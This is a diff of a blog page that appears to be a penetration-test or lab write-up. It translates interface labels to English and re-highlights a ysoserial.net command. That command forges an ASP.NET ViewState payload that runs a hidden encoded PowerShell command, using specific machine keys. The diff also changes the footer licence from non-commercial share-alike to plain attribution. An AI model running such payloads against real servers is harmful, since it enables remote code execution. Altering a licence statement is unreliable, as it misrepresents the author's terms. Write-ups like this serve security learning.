@@ -149,7 +149,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -287,7 +287,7 @@
 <li>Exploiting __VIEWSTATE knowing the secrets - HackTricks<br><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret</a></li>
 <li>pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters<br><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net</a></li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="string">"powershell.exe -nop -w hidden -e xxxxxx"</span> --path=<span class="string">"/portfolio/default.aspx"</span> --apppath=<span class="string">"default.aspx"</span> --decryptionalg=<span class="string">"AES"</span> --decryptionkey=<span class="string">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> --validationalg=<span class="string">"SHA1"</span> --validationkey=<span class="string">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe <span class="literal">-p</span> ViewState <span class="literal">-g</span> TextFormattingRunProperties <span class="literal">-c</span> <span class="string">"powershell.exe -nop -w hidden -e xxxxxx"</span> -<span class="literal">-path</span>=<span class="string">"/portfolio/default.aspx"</span> -<span class="literal">-apppath</span>=<span class="string">"default.aspx"</span> -<span class="literal">-decryptionalg</span>=<span class="string">"AES"</span> -<span class="literal">-decryptionkey</span>=<span class="string">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> -<span class="literal">-validationalg</span>=<span class="string">"SHA1"</span> -<span class="literal">-validationkey</span>=<span class="string">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span></span><br></pre></td></tr></table></figure>
 
 <p>生成结果，base64编码后，替换请求中的viewstate即可，得到sfitz：</p>
 <figure class="image-bubble">
@@ -362,7 +362,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2024-06-11T01:28:47.946Z" itemprop="dateUpdated">2024-06-11 09:28:47</time>
+    Last updated: <time datetime="2024-06-11T01:28:47.946Z" itemprop="dateUpdated">2024-06-11 09:28:47</time>
 </span><br>
 
 
@@ -529,7 +529,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
